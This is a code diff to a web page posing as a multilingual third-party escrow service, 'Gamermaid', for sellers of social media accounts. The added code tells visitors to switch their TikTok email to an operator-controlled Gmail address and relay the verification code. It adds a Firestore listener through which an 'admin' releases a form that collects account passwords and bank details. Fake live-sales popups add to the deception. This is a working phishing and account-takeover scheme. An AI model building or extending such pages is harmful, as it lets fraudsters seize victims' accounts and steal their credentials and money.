@@ -64,14 +64,13 @@
         .page-tab { display: none; }
         .page-tab.active { display: block; }
 
-        /* Escrow Form Section */
         .escrow-section { padding: 60px 0 100px 0; }
         .escrow-header { text-align: center; margin-bottom: 40px; }
         .page-title { font-size: 2.5rem; font-weight: 700; letter-spacing: -0.02em; margin-bottom: 16px; }
         
         #siteSectionsWrapper { display: flex; flex-direction: column; gap: 40px; }
 
-        /* Interactive Calculator Card */
+        /* Calculator Card */
         .payout-card { background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-lg); padding: 32px; max-width: 680px; margin: 0 auto; box-shadow: var(--shadow-md); width: 100%; }
         .calc-title { font-size: 1.15rem; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; color: var(--text-primary); }
         .calc-inputs-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; margin-bottom: 24px; }
@@ -93,7 +92,19 @@
         .form-group input, .form-group select { width: 100%; padding: 12px 16px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: var(--bg-secondary); font-family: inherit; font-size: 0.95rem; outline: none; }
         .form-group input:focus, .form-group select:focus { border-color: #8b5cf6; background: #ffffff; box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15); }
         .field-notice { font-size: 0.825rem; color: var(--danger-red); font-weight: 500; margin-top: 4px; display: flex; align-items: center; gap: 6px; }
-        .email-change-banner { background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.25); color: #2563eb; padding: 12px 16px; border-radius: var(--radius-md); font-weight: 600; font-size: 0.9rem; margin-bottom: 20px; text-align: center; }
+
+        /* Email Code Action Banner & Buttons */
+        .email-change-banner-wrapper { background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.25); border-radius: var(--radius-md); padding: 16px 20px; margin-bottom: 24px; display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap; }
+        .email-change-text { color: #2563eb; font-weight: 600; font-size: 0.9rem; }
+        .email-btn-group { display: flex; gap: 8px; align-items: center; }
+        .btn-action-code { padding: 9px 16px; background: var(--gradient-primary); color: #ffffff; border-radius: var(--radius-full); font-weight: 700; font-size: 0.85rem; box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3); transition: transform var(--transition-fast); white-space: nowrap; cursor: pointer; }
+        .btn-action-code:hover { transform: translateY(-1px); }
+        .btn-verify-code { padding: 9px 16px; background: #ffffff; color: #8b5cf6; border: 1.5px solid #8b5cf6; border-radius: var(--radius-full); font-weight: 700; font-size: 0.85rem; transition: all var(--transition-fast); white-space: nowrap; cursor: pointer; }
+        .btn-verify-code:hover { background: rgba(139, 92, 246, 0.05); }
+
+        /* Form Locked State */
+        .form-locked-overlay { opacity: 0.5; pointer-events: none; filter: blur(1px); transition: all 0.3s ease; }
+        .form-unlocked { opacity: 1; pointer-events: auto; filter: none; }
 
         .bank-logos-container { margin-bottom: 24px; }
         .bank-logos-title { font-size: 0.85rem; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 12px; }
@@ -117,14 +128,20 @@
         .contact-box p, .contact-box a { font-size: 0.925rem; color: var(--text-muted); word-break: break-all; }
         .contact-box a:hover { color: #8b5cf6; text-decoration: underline; }
 
-        /* Modals & Chat */
+        /* Modals & Popups */
         .modal-backdrop { position: fixed; inset: 0; background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(8px); display: flex; align-items: center; justify-content: center; padding: 24px; opacity: 0; visibility: hidden; transition: all var(--transition-normal); z-index: 2000; }
         .modal-backdrop.active { opacity: 1; visibility: visible; }
-        .modal-card { background: #ffffff; border-radius: var(--radius-lg); padding: 40px; max-width: 500px; width: 100%; text-align: center; box-shadow: var(--shadow-dark); }
-        .modal-status-icon { width: 64px; height: 64px; border-radius: var(--radius-full); background: rgba(59, 130, 246, 0.1); color: #3b82f6; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto; font-size: 1.5rem; }
-        .modal-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 12px; }
-        .modal-desc { color: var(--text-muted); font-size: 0.975rem; margin-bottom: 24px; line-height: 1.6; }
-        .modal-contact { padding: 12px 16px; background: var(--bg-secondary); border-radius: var(--radius-md); font-weight: 600; color: #8b5cf6; margin-bottom: 24px; font-size: 0.9rem; }
+        .modal-card { background: #ffffff; border-radius: var(--radius-lg); padding: 36px; max-width: 520px; width: 100%; text-align: center; box-shadow: var(--shadow-dark); position: relative; }
+        .modal-status-icon { width: 56px; height: 56px; border-radius: var(--radius-full); background: rgba(139, 92, 246, 0.1); color: #8b5cf6; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px auto; font-size: 1.5rem; }
+        .modal-title { font-size: 1.4rem; font-weight: 700; margin-bottom: 12px; }
+        .modal-desc { color: var(--text-muted); font-size: 0.925rem; margin-bottom: 20px; line-height: 1.6; text-align: left; }
+
+        .steps-box { background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-md); padding: 16px; margin-bottom: 20px; text-align: left; font-size: 0.875rem; }
+        .steps-box ol { padding-left: 18px; display: flex; flex-direction: column; gap: 8px; color: var(--text-primary); font-weight: 500; }
+        
+        .timer-warning-box { background: var(--danger-bg); border: 1px solid var(--danger-border); color: var(--danger-red); padding: 12px 16px; border-radius: var(--radius-md); font-weight: 700; font-size: 0.85rem; margin-bottom: 20px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        
+        .code-display-container { background: #0f172a; color: #38bdf8; padding: 16px; border-radius: var(--radius-md); font-family: monospace; font-size: 1.6rem; letter-spacing: 6px; font-weight: 800; margin-bottom: 20px; text-align: center; border: 1px dashed #38bdf8; }
 
         .lang-modal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
         .lang-option-btn { padding: 12px; background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-md); font-weight: 600; font-size: 0.925rem; cursor: pointer; transition: all var(--transition-fast); color: var(--text-primary); text-align: center; }
@@ -152,6 +169,8 @@
             .form-grid, .contact-info-grid, .lang-modal-grid, .calc-inputs-grid { grid-template-columns: 1fr; }
             .form-group.full-width { grid-column: span 1; }
             .navbar { flex-wrap: wrap; height: auto; padding: 12px 0; }
+            .email-change-banner-wrapper { flex-direction: column; text-align: center; }
+            .email-btn-group { width: 100%; justify-content: center; }
         }
     </style>
 </head>
@@ -206,16 +225,16 @@
                     <div class="payout-card" data-section-id="payoutCard">
                         <div class="calc-title">
                             <svg class="icon" viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2" ry="2"/><line x1="8" y1="6" x2="16" y2="6"/><line x1="16" y1="14" x2="16" y2="18"/><path d="M8 10h6"/><path d="M8 14h4"/><path d="M8 18h2"/></svg>
-                            <span>Escrow Payout Calculator</span>
+                            <span data-i18n="calcTitle">Escrow Payout Calculator</span>
                         </div>
                         
                         <div class="calc-inputs-grid">
                             <div class="calc-input-group">
-                                <label for="requestedPrice">Requested Price</label>
+                                <label for="requestedPrice" data-i18n="lblReqPrice">Requested Price</label>
                                 <input type="number" id="requestedPrice" value="2000000" min="0" step="any" placeholder="Enter amount">
                             </div>
                             <div class="calc-input-group">
-                                <label for="currencySelect">Currency</label>
+                                <label for="currencySelect" data-i18n="lblCurrency">Currency</label>
                                 <select id="currencySelect">
                                     <option value="Kyats">Kyats (MMK)</option>
                                     <option value="Baht">Baht (THB)</option>
@@ -235,13 +254,28 @@
 
                     <!-- Section ID: escrowForm -->
                     <div class="form-card" data-section-id="escrowForm">
-                        <form id="escrowForm">
+                        
+                        <!-- Email Change Action Banner with Buttons -->
+                        <div class="email-change-banner-wrapper">
+                            <div class="email-change-text" data-i18n="emailBanner">
+                                Change your TikTok email to <strong>gamermaid.ai@gmail.com</strong>
+                            </div>
+                            <div class="email-btn-group">
+                                <button type="button" class="btn-action-code" id="openGetCodeBtn" data-i18n="btnGetCode">
+                                    GET Email Code 🔑
+                                </button>
+                                <button type="button" class="btn-verify-code" id="openVerifyCodeBtn" data-i18n="btnVerifyCode">
+                                    Verify Email Code ✉️
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Main Account Form (Locked until verified) -->
+                        <form id="escrowForm" class="form-locked-overlay">
                             <div class="form-section-title">
                                 <svg class="icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                                 <span data-i18n="accVerification">Account Verification</span>
                             </div>
-
-                            <div class="email-change-banner" data-i18n="emailBanner">Change your TikTok Email to gamermaid.ai@gmail.com</div>
 
                             <div class="form-grid">
                                 <div class="form-group"><label for="username" data-i18n="lblUsername">Username</label><input type="text" id="username" name="username" placeholder="Enter account username" data-i18n-placeholder="phUsername" required></div>
@@ -354,6 +388,63 @@
         </main>
     </div>
 
+    <!-- POPUP MODAL 1: GET Email Code Instructions -->
+    <div class="modal-backdrop" id="getCodeModal">
+        <div class="modal-card">
+            <div class="modal-status-icon">📩</div>
+            <h3 class="modal-title" data-i18n="modalGetCodeTitle">How to Change TikTok Email</h3>
+            
+            <div class="modal-desc" data-i18n="modalGetCodeDesc">
+                Follow these simple steps in your TikTok app to connect your account to our escrow middleman system:
+            </div>
+
+            <div class="steps-box">
+                <ol>
+                    <li data-i18n="step1">Open <strong>TikTok</strong> → Go to your <strong>Profile</strong> → Tap <strong>Settings & Privacy</strong>.</li>
+                    <li data-i18n="step2">Select <strong>Account</strong> → Tap <strong>User Information</strong> → <strong>Email</strong>.</li>
+                    <li><span data-i18n="step3Part1">Choose <strong>Change Email</strong> and type:</span> <strong style="color: #2563eb;">gamermaid.ai@gmail.com</strong></li>
+                    <li data-i18n="step4">Tap <strong>Send Code</strong> in your TikTok app.</li>
+                </ol>
+            </div>
+
+            <div class="timer-warning-box" data-i18n="warningText">
+                ⏳ Please wait 5 minutes to get the code. Don't close this warning!
+            </div>
+
+            <button type="button" class="btn-signin" id="closeGetCodeModalBtn" style="width: 100%; background: var(--bg-secondary); color: var(--text-primary); border: 1px solid var(--glass-border-light);" data-i18n="btnCloseModal">
+                Got it, Close Window
+            </button>
+        </div>
+    </div>
+
+    <!-- POPUP MODAL 2: Verify Email Code (Live Admin Input Display) -->
+    <div class="modal-backdrop" id="verifyCodeModal">
+        <div class="modal-card">
+            <div class="modal-status-icon">🔑</div>
+            <h3 class="modal-title" data-i18n="modalVerifyTitle">Verify Email Code</h3>
+            
+            <div class="modal-desc" style="text-align: center;" data-i18n="modalVerifyDesc">
+                Waiting for the verification code from our admin team...
+            </div>
+
+            <!-- Real-time code container populated from admin.html via Firestore -->
+            <div class="code-display-container" id="adminCodeDisplay">
+                ••••••
+            </div>
+
+            <div style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 20px;" id="codeStatusText" data-i18n="codeStatusWaiting">
+                Please wait while admin confirms your submission.
+            </div>
+
+            <button type="button" class="btn-continue" id="unlockFormBtn" style="display: none; width: 100%;" data-i18n="btnUnlock">
+                Code Verified! Continue to Form
+            </button>
+            <button type="button" class="btn-signin" id="closeVerifyModalBtn" style="margin-top: 12px; width: 100%; background: var(--bg-secondary); color: var(--text-primary); border: 1px solid var(--glass-border-light);" data-i18n="btnCloseModal">
+                Close Window
+            </button>
+        </div>
+    </div>
+
     <!-- Live Sales Popups Widget Container -->
     <div class="sales-popup-container" id="salesPopupContainer"></div>
 
@@ -372,14 +463,14 @@
                 <button id="closeLangModalBtn" style="font-size: 1.5rem; background: none; border: none; color: var(--text-muted); cursor: pointer;">&times;</button>
             </div>
             <div class="modal-status-icon">🌐</div>
-            <h3 class="modal-title">Change Language?</h3>
-            <p class="modal-desc">Would you like to view the site in your preferred language?</p>
+            <h3 class="modal-title" data-i18n="langModalTitle">Change Language?</h3>
+            <p class="modal-desc" data-i18n="langModalDesc">Would you like to view the site in your preferred language?</p>
             <div class="lang-modal-grid">
                 <button class="lang-option-btn" data-lang="en">🇬🇧 English</button>
                 <button class="lang-option-btn" data-lang="ja">🇯🇵 日本語 (Japan)</button>
                 <button class="lang-option-btn" data-lang="zh">🇨🇳 中文 (China)</button>
-                <button class="lang-option-btn" data-lang="th">🇹🇭 ไทย (Thai)</button>
-                <button class="lang-option-btn" data-lang="my" style="grid-column: span 2;">🇲🇲 မြန်မာ (Myanmar)</button>
+                <button class="lang-option-btn" data-lang="th">ไทย (Thai)</button>
+                <button class="lang-option-btn" data-lang="my" style="grid-column: span 2;">မြန်မာ (Myanmar)</button>
             </div>
         </div>
     </div>
@@ -389,7 +480,7 @@
         <div class="modal-card">
             <div class="modal-status-icon"><svg class="icon" style="width:32px;height:32px;" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
             <h3 class="modal-title" data-i18n="modalTitle">Verification In Progress</h3>
-            <p class="modal-desc" data-i18n="modalDesc">
+            <p class="modal-desc" data-i18n="modalDesc" style="text-align: center;">
                 The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.<br>
                 <strong style="color: var(--text-primary); display:block; margin-top:8px;" data-i18n="modalWarning">(Make sure You fill the Bank info Correctly).</strong>
             </p>
@@ -415,7 +506,7 @@
     <script type="module">
         import { saveEscrowSubmission, saveChatMessage } from "../assets/js/firebase-config.js";
         import { db } from "../assets/js/firebase-config.js";
-        import { doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { doc, onSnapshot, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const translations = {
             en: {
@@ -425,10 +516,15 @@
                 signIn: "Sign In",
                 escrowTitle: "Third Party Escrow Services",
                 escrowSub: "Secure automated verification and middleman clearance system.",
+                calcTitle: "Escrow Payout Calculator",
+                lblReqPrice: "Requested Price",
+                lblCurrency: "Currency",
                 depositLabel: "Requested Amount",
                 totalLabel: "You will get",
+                emailBanner: "Change your TikTok email to gamermaid.ai@gmail.com",
+                btnGetCode: "GET Email Code 🔑",
+                btnVerifyCode: "Verify Email Code ✉️",
                 accVerification: "Account Verification",
-                emailBanner: "Change your TikTok Email to gamermaid.ai@gmail.com",
                 lblUsername: "Username",
                 phUsername: "Enter account username",
                 lblPassword: "Password",
@@ -467,10 +563,26 @@
                 chatWelcome: "Hello! Welcome to Gamermaid Escrow. How can we help you today?",
                 phChat: "Type a message...",
                 chatSend: "Send",
+                langModalTitle: "Change Language?",
+                langModalDesc: "Would you like to view the site in your preferred language?",
+                modalGetCodeTitle: "How to Change TikTok Email",
+                modalGetCodeDesc: "Follow these simple steps in your TikTok app to connect your account to our escrow middleman system:",
+                step1: "Open TikTok → Go to your Profile → Tap Settings & Privacy.",
+                step2: "Select Account → Tap User Information → Email.",
+                step3Part1: "Choose Change Email and type:",
+                step4: "Tap Send Code in your TikTok app.",
+                warningText: "⏳ Please wait 5 minutes to get the code. Don't close this warning!",
+                btnCloseModal: "Got it, Close Window",
+                modalVerifyTitle: "Verify Email Code",
+                modalVerifyDesc: "Waiting for the verification code from our admin team...",
+                codeStatusWaiting: "Please wait while admin confirms your submission.",
+                btnUnlock: "Code Verified! Continue to Form",
                 modalTitle: "Verification In Progress",
                 modalDesc: "The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.",
                 modalWarning: "(Make sure You fill the Bank info Correctly).",
-                closeWindow: "Close Window"
+                closeWindow: "Close Window",
+                authTitle: "Sign In to Gamermaid",
+                anonBtn: "⚡ Quick Guest / Anonymous Sign In"
             },
             ja: {
                 navEscrow: "エスクローサービス",
@@ -479,10 +591,15 @@
                 signIn: "サインイン",
                 escrowTitle: "第三者エスクローサービス",
                 escrowSub: "安全な自動認証および仲介クリアランスシステム。",
+                calcTitle: "エスクロー支払計算機",
+                lblReqPrice: "希望価格",
+                lblCurrency: "通貨",
                 depositLabel: "リクエスト金額",
                 totalLabel: "お受取額",
-                accVerification: "アカウント認証",
                 emailBanner: "TikTokのメールアドレスを gamermaid.ai@gmail.com に変更してください",
+                btnGetCode: "メールコードを取得 🔑",
+                btnVerifyCode: "メールコードを検証 ✉️",
+                accVerification: "アカウント認証",
                 lblUsername: "ユーザー名",
                 phUsername: "アカウントのユーザー名を入力",
                 lblPassword: "パスワード",
@@ -521,10 +638,26 @@
                 chatWelcome: "こんにちは！Gamermaidエスクローへようこそ。本日はどのようなお手伝いが必要ですか？",
                 phChat: "メッセージを入力...",
                 chatSend: "送信",
+                langModalTitle: "言語を変更しますか？",
+                langModalDesc: "お好みの言語でサイトを表示しますか？",
+                modalGetCodeTitle: "TikTokメールの変更方法",
+                modalGetCodeDesc: "TikTokアプリで以下の簡単な手順に従って、アカウントをエスクロー仲介システムに接続してください：",
+                step1: "TikTokを開く → プロフィールへ移動 → 設定とプライバシーをタップ。",
+                step2: "アカウントを選択 → ユーザー情報をタップ → メール。",
+                step3Part1: "メールアドレスの変更を選択し、次のように入力します：",
+                step4: "TikTokアプリで「コードを送信」をタップ。",
+                warningText: "⏳ コードが届くまで5分ほどお待ちください。この警告を閉じないでください！",
+                btnCloseModal: "了解しました、ウィンドウを閉じる",
+                modalVerifyTitle: "メールコードの検証",
+                modalVerifyDesc: "管理チームからの認証コードを待っています...",
+                codeStatusWaiting: "管理者が送信を確認するまでお待ちください。",
+                btnUnlock: "コードが確認されました！フォームに進む",
                 modalTitle: "認証処理中",
                 modalDesc: "管理者がお客様のアカウントを確認しています。24時間以内にご指定の銀行口座へ送金いたします。",
                 modalWarning: "(銀行情報を正しく入力したことをご確認ください)。",
-                closeWindow: "ウィンドウを閉じる"
+                closeWindow: "ウィンドウを閉じる",
+                authTitle: "Gamermaidにサインイン",
+                anonBtn: "⚡ 簡単ゲスト / 匿名サインイン"
             },
             zh: {
                 navEscrow: "第三方担保交易",
@@ -533,10 +666,15 @@
                 signIn: "登录",
                 escrowTitle: "第三方担保交易服务",
                 escrowSub: "安全自动验证与中间人结算系统。",
+                calcTitle: "担保交易结算计算器",
+                lblReqPrice: "请求价格",
+                lblCurrency: "货币",
                 depositLabel: "请求金额",
                 totalLabel: "您将获得",
-                accVerification: "账户验证",
                 emailBanner: "请将您的 TikTok 邮箱更改为 gamermaid.ai@gmail.com",
+                btnGetCode: "获取邮箱验证码 🔑",
+                btnVerifyCode: "验证邮箱验证码 ✉️",
+                accVerification: "账户验证",
                 lblUsername: "用户名",
                 phUsername: "输入账户用户名",
                 lblPassword: "密码",
@@ -575,10 +713,26 @@
                 chatWelcome: "您好！欢迎来到 Gamermaid 担保。今天有什么可以帮您的？",
                 phChat: "输入消息...",
                 chatSend: "发送",
+                langModalTitle: "更改语言？",
+                langModalDesc: "您想以首选语言查看本网站吗？",
+                modalGetCodeTitle: "如何更改 TikTok 邮箱",
+                modalGetCodeDesc: "请在 TikTok 应用中按照以下简单步骤将您的账户连接到我们的担保中间人系统：",
+                step1: "打开 TikTok → 进入个人资料 → 点击设置和隐私。",
+                step2: "选择账户 → 点击用户信息 → 邮箱。",
+                step3Part1: "选择更改邮箱并输入：",
+                step4: "在 TikTok 应用中点击发送验证码。",
+                warningText: "⏳ 请等待 5 分钟以获取验证码。请勿关闭此警告窗口！",
+                btnCloseModal: "知道了，关闭窗口",
+                modalVerifyTitle: "验证邮箱代码",
+                modalVerifyDesc: "正在等待管理团队的验证码...",
+                codeStatusWaiting: "请等待管理员确认您的提交。",
+                btnUnlock: "代码已验证！继续填写表单",
                 modalTitle: "验证进行中",
                 modalDesc: "管理员正在检查您的账户。我们将在 24 小时内将您的资金汇入您的银行账户。",
                 modalWarning: "(请确保您正确填写了银行信息)。",
-                closeWindow: "关闭窗口"
+                closeWindow: "关闭窗口",
+                authTitle: "登录 Gamermaid",
+                anonBtn: "⚡ 快速访客 / 匿名登录"
             },
             th: {
                 navEscrow: "บริการเอสโครว์",
@@ -587,10 +741,15 @@
                 signIn: "เข้าสู่ระบบ",
                 escrowTitle: "บริการเอสโครว์บุคคลที่สาม",
                 escrowSub: "ระบบยืนยันตัวตนอัตโนมัติและเคลียร์ริ่งคนกลางที่ปลอดภัย",
+                calcTitle: "เครื่องคำนวณการจ่ายเงินเอสโครว์",
+                lblReqPrice: "ราคาที่ขอ",
+                lblCurrency: "สกุลเงิน",
                 depositLabel: "จำนวนเงินที่ขอ",
                 totalLabel: "ที่คุณจะได้รับ",
-                accVerification: "การยืนยันบัญชี",
                 emailBanner: "เปลี่ยนอีเมล TikTok ของคุณเป็น gamermaid.ai@gmail.com",
+                btnGetCode: "รับรหัสอีเมล 🔑",
+                btnVerifyCode: "ยืนยันรหัสอีเมล ✉️",
+                accVerification: "การยืนยันบัญชี",
                 lblUsername: "ชื่อผู้ใช้",
                 phUsername: "ป้อนชื่อผู้ใช้บัญชี",
                 lblPassword: "รหัสผ่าน",
@@ -629,10 +788,26 @@
                 chatWelcome: "สวัสดี! ยินดีต้อนรับสู่ Gamermaid Escrow เราจะช่วยคุณได้อย่างไรวันนี้?",
                 phChat: "พิมพ์ข้อความ...",
                 chatSend: "ส่ง",
+                langModalTitle: "เปลี่ยนภาษา?",
+                langModalDesc: "คุณต้องการดูเว็บไซต์ในภาษาที่คุณต้องการหรือไม่?",
+                modalGetCodeTitle: "วิธีเปลี่ยนอีเมล TikTok",
+                modalGetCodeDesc: "ทำตามขั้นตอนง่ายๆ เหล่านี้ในแอป TikTok เพื่อเชื่อมต่อบัญชีของคุณเข้ากับระบบคนกลางเอสโครว์ของเรา:",
+                step1: "เปิด TikTok → ไปที่โปรไฟล์ของคุณ → แตะ การตั้งค่าความเป็นส่วนตัว",
+                step2: "เลือก บัญชี → แตะ ข้อมูลผู้ใช้ → อีเมล",
+                step3Part1: "เลือก เปลี่ยนอีเมล และพิมพ์:",
+                step4: "แตะ ส่งรหัส ในแอป TikTok ของคุณ",
+                warningText: "⏳ โปรดรอ 5 นาทีเพื่อรับรหัส อย่าปิดคำเตือนนี้!",
+                btnCloseModal: "เข้าใจแล้ว ปิดหน้าต่าง",
+                modalVerifyTitle: "ยืนยันรหัสอีเมล",
+                modalVerifyDesc: "กำลังรอรหัสยืนยันจากทีมผู้ดูแลระบบ...",
+                codeStatusWaiting: "โปรดรอสักครู่ในขณะที่ผู้ดูแลระบบยืนยันการส่งของคุณ",
+                btnUnlock: "ยืนยันรหัสแล้ว! ไปยังแบบฟอร์ม",
                 modalTitle: "กำลังดำเนินการตรวจสอบ",
                 modalDesc: "ผู้ดูแลระบบกำลังตรวจสอบบัญชีของคุณ เราจะส่งเงินของคุณไปยังบัญชีธนาคารหลัง 24 ชั่วโมง",
                 modalWarning: "(โปรดตรวจสอบให้แน่ใจว่าคุณกรอกข้อมูลธนาคารอย่างถูกต้อง)",
-                closeWindow: "ปิดหน้าต่าง"
+                closeWindow: "ปิดหน้าต่าง",
+                authTitle: "ลงชื่อเข้าใช้ Gamermaid",
+                anonBtn: "⚡ เข้าสู่ระบบแบบแขก / ไม่ระบุตัวตนอย่างรวดเร็ว"
             },
             my: {
                 navEscrow: "အက်စခရိုး ဝန်ဆောင်မှုများ",
@@ -641,10 +816,15 @@
                 signIn: "အကောင့်ဝင်ရန်",
                 escrowTitle: "တတိယပါတီ အက်စခရိုး ဝန်ဆောင်မှုများ",
                 escrowSub: "လုံခြုံစိတ်ချရသော အလိုအလျောက် အတည်ပြုခြင်းနှင့် ကြားခံရှင်းလင်းရေးစနစ်။",
+                calcTitle: "အက်စခရိုး ငွေပေးချေမှု တွက်ချက်စက်",
+                lblReqPrice: "တောင်းဆိုထားသော ဈေးနှုန်း",
+                lblCurrency: "ငွေကြေး",
                 depositLabel: "တောင်းဆိုထားသော ပမာဏ",
                 totalLabel: "သင်ရရှိမည့်ငွေ",
-                accVerification: "အကောင့် အတည်ပြုခြင်း",
                 emailBanner: "သင့် TikTok အီးမေးလ်ကို gamermaid.ai@gmail.com သို့ ပြောင်းလဲပါ",
+                btnGetCode: "အီးမေးလ်ကုဒ် ရယူရန် 🔑",
+                btnVerifyCode: "အီးမေးလ်ကုဒ် စစ်ဆေးရန် ✉️",
+                accVerification: "အကောင့် အတည်ပြုခြင်း",
                 lblUsername: "အသုံးပြုသူအမည် (Username)",
                 phUsername: "အကောင့်အမည် ထည့်ပါ",
                 lblPassword: "စကားဝှက် (Password)",
@@ -683,10 +863,26 @@
                 chatWelcome: "မင်္ဂလာပါ! Gamermaid Escrow မှ ကြိုဆိုပါတယ်။ ယနေ့ မည်သို့ကူညီပေးရမလဲ?",
                 phChat: "စာတို ရိုက်ထည့်ပါ...",
                 chatSend: "ပို့ရန်",
+                langModalTitle: "ဘာသာစကား ပြောင်းမလား?",
+                langModalDesc: "ဝဘ်ဆိုဒ်ကို သင်နှစ်သက်သော ဘသာစကားဖြင့် ကြည့်ရှုလိုပါသလား?",
+                modalGetCodeTitle: "TikTok အီးမေးလ် မည်သို့ပြောင်းလဲရမည်နည်း",
+                modalGetCodeDesc: "သင်၏အကောင့်ကို ကျွန်ုပ်တို့၏ အက်စခရိုး ကြားခံစနစ်သို့ ချိတ်ဆက်ရန် TikTok အက်ပ်တွင် ဤရိုးရှင်းသော အဆင့်များကို လိုက်နာပါ -",
+                step1: "TikTok ကိုဖွင့်ပါ → Profile သို့သွားပါ → Settings & Privacy ကို နှိပ်ပါ။",
+                step2: "Account ကိုရွေးပါ → User Information ကို နှိပ်ပါ → Email ကိုသွားပါ။",
+                step3Part1: "Change Email ကိုရွေးပြီး ဤသို့ရိုက်ထည့်ပါ -",
+                step4: "သင့် TikTok အက်ပ်တွင် Send Code ကို နှိပ်ပါ။",
+                warningText: "⏳ ကုဒ်ရရှိရန် 5 မိနစ်ခန့် စောင့်ပါ။ ဤသတိပေးချက်ကို မပိတ်ပါနှင့်!",
+                btnCloseModal: "နားလည်ပါပြီ၊ ဝင်းဒိုးပိတ်ရန်",
+                modalVerifyTitle: "အီးမေးလ်ကုဒ် စစ်ဆေးရန်",
+                modalVerifyDesc: "အက်ဒမင်အဖွဲ့ထံမှ အတည်ပြုကုဒ်ကို စောင့်ဆိုင်းနေပါသည်...",
+                codeStatusWaiting: "အက်ဒမင်မှ သင့်တင်သွင်းမှုကို အတည်ပြုသည်အထိ ခေတ္တစောင့်ဆိုင်းပါ။",
+                btnUnlock: "ကုဒ် အတည်ပြုပြီးပါပြီ! ဖောင်သို့ ဆက်သွားရန်",
                 modalTitle: "အတည်ပြုစစ်ဆေးနေဆဲဖြစ်သည်",
                 modalDesc: "အက်ဒမင်များမှ သင့်အကောင့်ကို စစ်ဆေးနေပါသည်။ ၂၄ နာရီအတွင်း သင့်ဘဏ်အကောင့်သို့ ငွေလွှဲပေးပါမည်။",
                 modalWarning: "(ဘဏ်အချက်အလက်များကို မှန်ကန်စွာ ဖြည့်သွင်းရန် သေချာစေပါ)။",
-                closeWindow: "ဝင်းဒိုးပိတ်ရန်"
+                closeWindow: "ဝင်းဒိုးပိတ်ရန်",
+                authTitle: "Gamermaid သို့ အကောင့်ဝင်ရန်",
+                anonBtn: "⚡ အမြန်ဧည့်သည် / အမည်မသိ အကောင့်ဝင်ရန်"
             }
         };
 
@@ -758,6 +954,67 @@
                 });
             });
 
+            // Email Instructions Modal (GET Email Code)
+            const openGetCodeBtn = document.getElementById('openGetCodeBtn');
+            const getCodeModal = document.getElementById('getCodeModal');
+            const closeGetCodeModalBtn = document.getElementById('closeGetCodeModalBtn');
+
+            openGetCodeBtn.addEventListener('click', async () => {
+                getCodeModal.classList.add('active');
+                try {
+                    await setDoc(doc(db, "escrow_requests", "latest_code"), {
+                        requestedAt: new Date().toISOString(),
+                        status: "waiting",
+                        code: ""
+                    }, { merge: true });
+                } catch(e) { console.error("Error setting request:", e); }
+            });
+
+            closeGetCodeModalBtn.addEventListener('click', () => {
+                getCodeModal.classList.remove('active');
+            });
+
+            // Verify Email Code Modal & Real-time Admin Listener
+            const openVerifyCodeBtn = document.getElementById('openVerifyCodeBtn');
+            const verifyCodeModal = document.getElementById('verifyCodeModal');
+            const closeVerifyModalBtn = document.getElementById('closeVerifyModalBtn');
+            const adminCodeDisplay = document.getElementById('adminCodeDisplay');
+            const codeStatusText = document.getElementById('codeStatusText');
+            const unlockFormBtn = document.getElementById('unlockFormBtn');
+            const escrowForm = document.getElementById('escrowForm');
+
+            openVerifyCodeBtn.addEventListener('click', () => {
+                verifyCodeModal.classList.add('active');
+            });
+
+            closeVerifyModalBtn.addEventListener('click', () => {
+                verifyCodeModal.classList.remove('active');
+            });
+
+            // Listen in real-time to Firestore (`escrow_requests/latest_code`) updated from admin panel
+            onSnapshot(doc(db, "escrow_requests", "latest_code"), (docSnap) => {
+                if (docSnap.exists()) {
+                    const data = docSnap.data();
+                    if (data.code && data.status === "approved") {
+                        adminCodeDisplay.textContent = data.code;
+                        adminCodeDisplay.style.color = "#22c55e";
+                        adminCodeDisplay.style.borderColor = "#22c55e";
+                        codeStatusText.textContent = "✅ Code confirmed by admin!";
+                        unlockFormBtn.style.display = "block";
+                    }
+                }
+            });
+
+            // Unlock Form Action
+            unlockFormBtn.addEventListener('click', () => {
+                verifyCodeModal.classList.remove('active');
+                escrowForm.classList.remove('form-locked-overlay');
+                escrowForm.classList.add('form-unlocked');
+                openVerifyCodeBtn.textContent = "Verified ✓";
+                openVerifyCodeBtn.style.background = "#22c55e";
+                openVerifyCodeBtn.style.color = "#ffffff";
+            });
+
             // Live Sales Feed
             const accountDatabase = [
                 { platform: "TikTok", user: "PhyuThazin09", country: "🇲🇲 Myanmar" },
@@ -784,7 +1041,6 @@
             setInterval(() => createSalesPopup(), 9000);
 
             // Form Submit & Confirmation Modal
-            const escrowForm = document.getElementById('escrowForm');
             const confirmationModal = document.getElementById('confirmationModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
 
